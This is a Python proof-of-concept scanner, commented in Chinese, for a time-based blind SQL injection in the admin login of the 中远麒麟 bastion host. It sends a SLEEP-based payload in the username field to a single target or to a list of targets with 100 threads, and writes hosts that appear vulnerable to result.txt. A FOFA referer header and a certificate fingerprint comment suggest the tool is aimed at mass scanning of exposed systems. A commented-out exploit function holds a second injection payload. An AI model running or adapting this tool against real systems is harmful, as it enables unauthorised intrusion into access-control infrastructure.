#       cert.subject="Baolei"
import sys, re, time, requests, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  # 禁用urllib3警告
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'
# 打印程序欢迎界面
def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 中远麒麟安全漏洞扫描工                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-09-3    
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)
# 主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟")
    parser.add_argument('-u', '--url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', type=str, help='File Path')
    args = parser.parse_args()
    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUsage: python3 {sys.argv[0]} -h\n")


# 漏洞检测函数
def poc(target):
    paylond = "/admin.php?controller=admin_commonuser"
    url = target + paylond
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://fofa.info/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "77"
    }
    data = {
        "username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.gt(\"5\") && time.lt(\"10\"))"
    }
    data1 = {
        "username":"admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.lt(\"5\")"
    }
    try:
        res = requests.get(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and "result" in res.text and "username and password does not match" in res.text:
            res1 =requests.get(url=url,headers=headers,data=data1,verify=False,timeout=10)
            if res1.status_code == 200 and "result" in res.text and "username and password does not match" in res1.text:
                print("[+] 这个url存在SQL注入" + target)
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target + "存在SQL注入\n")
        else:
            print("[-] 这个url不存在SQL注入")
    except:
        pass


if __name__ == '__main__':
    main()





# def exp(target):
# #     # SQL注入测试payload
# #     payload_url = "/admin.php?controller=admin_commonuser"
# #     url = target + payload_url
# #     # 请求头
# #     header = {
# #         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
# #         'Connection': 'close',
# #         'Content-Length': '78',
# #         'Accept': '*/*',
# #         'Content-Type': 'application/x-www-form-urlencoded',
# #         'Accept-Encoding': 'gzip',
# #     }
# #     data = "username=admin' AND 1=1-- -"  # 你的exp payload
# #     try:
# #         # 发送POST请求
# #         res1 = requests.post(url=url, headers=header, data=data, verify=False, timeout=5)  # 添加timeout参数
# #         # 检查响应状态码和内容是否包含指定字符串
# #         match = re.search(r'"result":0', res1.text, re.S)
# #         if res1.status_code == 200 and match:  # 修改判断条件
# #             print(f'[+] {GREEN}该网站存在SQL注入，url为 {target}\n{RESET}')
# #             # 将结果写入到result.txt文件中
# #             with open('result.txt', 'a') as f:
# #                 f.write(target + '\n')
# #         else:
# #             print(f'[-] 该网站不存在SQL注入')
# #             # 这里可以执行进一步的操作，比如写入日志或者进行其他后续攻击
# #     except Exception as e:
# #         # 捕获异常并打印错误信息
# #         print(f"[*] 该网站无法访问")
# #         return False